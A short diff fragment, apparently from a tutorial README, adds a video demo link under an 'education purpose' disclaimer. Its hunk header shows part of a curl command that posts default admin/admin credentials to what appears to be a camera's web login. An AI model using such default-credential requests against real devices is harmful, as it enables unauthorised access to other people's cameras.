@@ -13,4 +13,6 @@ curl -d "WAPLOGIN=admin&WAPPASSWORD=admin&PIC_SIZE=RES_0&FILEOK=camera.htm&FILEF
 
 This tutorial is only intended for education purpose not for any illegal activities.
 
+Demo: https://www.youtube.com/watch?v=7OJrjUkdyuw&t=34s
+
 
